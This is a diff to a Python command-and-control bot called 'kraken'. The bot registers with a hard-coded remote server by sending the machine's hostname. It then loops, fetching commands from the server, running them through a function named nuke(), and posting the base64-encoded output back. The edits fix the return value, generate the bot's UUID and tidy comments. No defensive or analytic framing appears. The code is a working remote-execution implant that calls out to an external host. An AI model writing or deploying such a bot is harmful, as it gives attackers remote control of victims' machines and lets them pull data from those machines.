@@ -42,7 +42,7 @@ def nuke(command):
 
     # Encode from bytes and decode into characters
     encode = base64.b64encode(resp).decode("utf-8")
-    return resp
+    return encode
 
 # Figure the bot's sleep time
 def sleepTime(ret):
@@ -67,17 +67,17 @@ def main():
     
     # Instantiate the bot and give it a uuid 
     kraken = Bot()
-    #TODO: CHANGE UUID 
-    kraken.uuid = "aeb"
+    kraken.uuid = getUUID()
 
     host = socket.gethostname() 
     server = 'http://129.21.115.114:8080'
     
-    # Send the bot info to the server to register to the server 
+    # Send the bot info to the server to register
     botInfo = {'uuid':kraken.uuid, 'config_interval':5, 'config_intervaldelta':5, 'config_servers':server,'facts_hostname':host, 'facts_interfaces':'eth0'}
     register = requests.post(server + '/register', data=botInfo)
+    
+    # Ensure the HTTP server replies normally 
     status = register.status_code
-    print(register.text)
 
     # Keep attempting to connect
     while (status != 200):
@@ -87,6 +87,8 @@ def main():
 
     # Keep looping for commands 
     while (True):
+
+        # Get commands from the server
         cmd = requests.post(server + '/getcommand', data=botInfo)
         cmd = cmd.text
         parsedCmd = json.loads(cmd)
@@ -102,7 +104,7 @@ def main():
             resp = nuke(parsedCmd.get("command"))
             errorCode = 0 
 
-        # Send results back
+        # Send results back to server 
         uaid = parsedCmd.get("uaid")
         botSend = {'uaid':uaid, 'uuid':kraken.uuid,'error':errorCode,'response':resp}
         sending = {"uuid": kraken.uuid ,"response_data":json.dumps(botSend)}
